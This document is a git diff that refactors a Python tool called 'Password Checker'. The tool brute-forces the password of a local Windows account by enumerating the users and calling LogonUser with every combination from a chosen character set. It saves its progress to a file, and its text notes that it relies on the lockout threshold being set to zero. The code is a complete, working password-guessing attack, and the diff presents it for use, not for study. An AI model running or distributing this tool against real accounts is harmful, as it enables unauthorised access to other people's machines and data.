@@ -1,19 +1,29 @@
 import ctypes
 from ctypes import wintypes
+
 import win32api
 import itertools
 import sys
 import argparse
 
-from core import list_users
-from core import LogonUser
+from core import (
+    list_users,
+    LogonUser,
+    PROGRESS_FILE
+)
 
-from LoadAndSaveFiles import load_progress, save_progress
-from LoadAndSaveFiles import loadGif
+from load_and_save_files import (
+    load_progress, 
+    save_progress,
+    load_gif
+)
 
-from Characters import charactes_password
+from characters import characters_password
 
-from test import authenticate_user, EnterUserNameAndPassword
+from test import (
+    authentificate_user, 
+    enter_username_and_password
+)
 
 epilog = """
 Password Checker is a program that logs into a Windows account by iterating through the characters given to it by the user.\n
@@ -21,34 +31,77 @@ It works if the user has a null value of \"lock threshold value\" in secpol.msc.
 Read more on Github: https://github.com/separeit894/password_checker/
 """
 
-characters = ''
+characters = ""
 # Параметр по умолчанию, изменять можете тут или в файле progress.json
 print_try = "y"
 account = None
 i = 1
 
-version = "5.2"
+version = "5.3"
 parser = argparse.ArgumentParser(description=epilog)
 
 subparsers = parser.add_subparsers(dest="command")
-parser_get = subparsers.add_parser('get', help="Get item value")
-#parser_get.add_argument('param', choices=['file', 'encoding', 'gif'], help="Gives the encoding that will be written to the file and a file in which the selection attempts will be recorded")
-parser_get.add_argument('--file', action="store_true", help='a file in which the selection attempts will be recorded')
-parser_get.add_argument('--encoding', action="store_true", help="Gives the encoding that will be written to the file")
-parser_get.add_argument('--gif', action='store_true', help="Use if you have an executable file and the gif doesn't launch with the -load-gif (--load-gif) argument.")
+parser_get = subparsers.add_parser("get", help="Get item value")
+parser_get.add_argument(
+    "--file",
+    action="store_true",
+    help="a file in which the selection attempts will be recorded",
+)
+parser_get.add_argument(
+    "--encoding",
+    action="store_true",
+    help="Gives the encoding that will be written to the file",
+)
+parser_get.add_argument(
+    "--gif",
+    action="store_true",
+    help="Use if you have an executable file and the gif doesn't launch with the -load-gif (--load-gif) argument.",
+)
 
 parser_set = subparsers.add_parser("set", help="Set item value")
 parser_set.add_argument("--encoding", type=str, help="Set the encoding to use")
 parser_set.add_argument("--file", type=str, help="Example : test.json")
 
 
-parser.add_argument("-v", "--version", action="store_true", help="show version this program")
-parser.add_argument("-t", "--test", "--testAuth", action="store_true", help="runs a script that checks the username and password for authentication.")
-parser.add_argument("-c", "--charset", type=str, help="Specifies the characters that will be used to guess the password.")
-parser.add_argument("--print-try",  choices=['y', 'n'],  help="If you select 'y', the match attempts will be shown every 250 matches. If 'n', each attempt will be shown. print")
-parser.add_argument("-u", "--user", type=str, help="Enter the username for which the password will be selected")
-parser.add_argument("-l", "--length", type=int, help="Enter this argument if you know the password length.")
-parser.add_argument("-load-gif", "--load-gif", action="store_true", help="Shows a gif file that disables the retry limiter.")
+parser.add_argument(
+    "-v", "--version", action="store_true", help="show version this program"
+)
+parser.add_argument(
+    "-t",
+    "--test",
+    "--testAuth",
+    action="store_true",
+    help="runs a script that checks the username and password for authentication.",
+)
+parser.add_argument(
+    "-c",
+    "--charset",
+    type=str,
+    help="Specifies the characters that will be used to guess the password.",
+)
+parser.add_argument(
+    "--print-try",
+    choices=["y", "n"],
+    help="If you select 'y', the match attempts will be shown every 250 matches. If 'n', each attempt will be shown. print",
+)
+parser.add_argument(
+    "-u",
+    "--user",
+    type=str,
+    help="Enter the username for which the password will be selected",
+)
+parser.add_argument(
+    "-l",
+    "--length",
+    type=int,
+    help="Enter this argument if you know the password length.",
+)
+parser.add_argument(
+    "-load-gif",
+    "--load-gif",
+    action="store_true",
+    help="Shows a gif file that disables the retry limiter.",
+)
 
 args = parser.parse_args()
 
@@ -58,82 +111,86 @@ if args.version:
     sys.exit(0)
 
 if args.test:
-    username, password = EnterUserNameAndPassword()
-    authenticate_user(username, password)
-    sys.exit(0) 
+    username, password = enter_username_and_password()
+    authentificate_user(username, password)
+    sys.exit(0)
 
 if args.charset:
     characters = args.charset
-    
+
 if args.print_try:
     print_try = args.print_try
-    
+
 if args.user:
     account = args.user
-    
+
 if args.length:
     i = args.length
 
 if args.command == "get":
     if args.encoding:
         from core import MY_ENCODING
+
         print(f"Encoding used : {MY_ENCODING}")
         sys.exit(0)
-        
+
     if args.file:
         from core import PROGRESS_FILE
+
         print(f"File used : {PROGRESS_FILE}")
         sys.exit(0)
-        
+
     if args.gif:
-        from LoadAndSaveFiles import UnloadGif
+        from load_and_save_files import UnloadGif
+
         UnloadGif()
         sys.exit(0)
-        
+
 elif args.command == "set":
     if args.encoding:
         print(f"{type(args.encoding)} : {args.encoding}")
         from core import set_encoding
+
         set_encoding(args.encoding)
     if args.file:
         from core import set_file
+
         set_file(args.file)
-        
-    
+
+
 if args.load_gif:
-    loadGif()
+    load_gif()
     sys.exit(0)
 
 
-print("Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!\n")
-print(f"Автор: separeit894\n"
-      f"Ccылка на github: https://github.com/separeit894/\n")
+print(
+    "Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!\n"
+)
+print("Автор: separeit894\nCcылка на github: https://github.com/separeit894/\n")
 
 users_list = list_users()
 
 LOGON32_LOGON_INTERACTIVE = 2
 LOGON32_PROVIDER_DEFAULT = 0
 
-from core import PROGRESS_FILE
-
 # Загрузка прогресса
 progress = load_progress()
 if progress:
-    account = args.user if args.user else progress['account']
-    i = args.length if args.length else progress['length']
-    try_id = progress['try_id']
-    tryed = progress['tryed']
-    characters = args.charset if args.charset else progress['characters']
-    print_try = str(args.print_try) if args.print_try else progress['print_try']
+    account = args.user if args.user else progress["account"]
+    i = args.length if args.length else progress["length"]
+    try_id = progress["try_id"]
+    tryed = progress["tryed"]
+    characters = args.charset if args.charset else progress["characters"]
+    print_try = str(args.print_try) if args.print_try else progress["print_try"]
 else:
     i = args.length if args.length else 1
     try_id = 0
     tryed = []
-    
+
     # Указываем учетную запись пользователя
     number = None
     find_account = True if args.user else False
-    
+
     # Цикл будет действовать пока find_account будет false
     while not find_account:
         for i, line in enumerate(users_list):
@@ -145,58 +202,65 @@ else:
                     account = users_list[number]
                     find_account = True
                     break
-            
+
         if number is None:
             number = int(input("Напишите номер учетной записи: "))
-        
+
     level = 0
     while True:
         if characters == "":
             if level > 1:
-                print(f"\nВы должны что-то выбрать!\n")
-            characters = charactes_password(characters)
+                print("\nВы должны что-то выбрать!\n")
+            characters = characters_password(characters)
             level += 1
         else:
             break
 
-username = account  
+username = account
 
 found = False
 
+
 def main():
-    global found,i, try_id
+    global found, i, try_id
     try:
         # Цикл будет работать, пока не найдет подходящий пароль
         while not found:
             # Циклом создаем новые пароли, characters это тот список символов, которые вы выбрали в начале
             for password in itertools.product(characters, repeat=i):
                 password = "".join(password)
-                
-                if not password in tryed:
+
+                if password not in tryed:
                     try_id += 1
                     # Попытка входа в систему
                     token = wintypes.HANDLE()
                     result = LogonUser(
-                    username,
-                    None,  # Локальная учетная запись
-                    password,
-                    LOGON32_LOGON_INTERACTIVE,
-                    LOGON32_PROVIDER_DEFAULT,
-                    ctypes.byref(token)
+                        username,
+                        None,  # Локальная учетная запись
+                        password,
+                        LOGON32_LOGON_INTERACTIVE,
+                        LOGON32_PROVIDER_DEFAULT,
+                        ctypes.byref(token),
                     )
 
                     # Если в файле progress.json, параметр print_try ( y )
                     if print_try == "y":
                         if result:
-                            print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
+                            print(
+                                f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}"
+                            )
                             found = True
                             input("Нажмите на Enter........ ")
                             break
                         else:
-                            print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
+                            print(
+                                f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}"
+                            )
                             tryed.append(password)
                             if win32api.GetLastError() == 1909:
-                                print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
+                                print(
+                                    "Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы"
+                                )
                                 input("Нажмите на Enter........ ")
                                 # Завершает работу
                                 sys.exit()
@@ -205,7 +269,9 @@ def main():
                     else:
                         # Выводит в случае, если получилось войти в учетную запись
                         if result:
-                            print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
+                            print(
+                                f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}"
+                            )
                             found = True
                             input("Нажмите на Enter........ ")
                             break
@@ -216,10 +282,14 @@ def main():
                             Параметр print_try (y/n)
                             """
                             if try_id % 250 == 0:
-                                print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
+                                print(
+                                    f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}"
+                                )
                             tryed.append(password)
                             if win32api.GetLastError() == 1909:
-                                print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
+                                print(
+                                    "Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы"
+                                )
                                 input("Нажмите на Enter........ ")
                                 sys.exit()
 
@@ -239,6 +309,7 @@ def main():
     except Exception as ex:
         print("Произошла ошибка: ", ex)
         input("Нажмите на Enter........ ")
+
 
 if __name__ == "__main__":
     main()
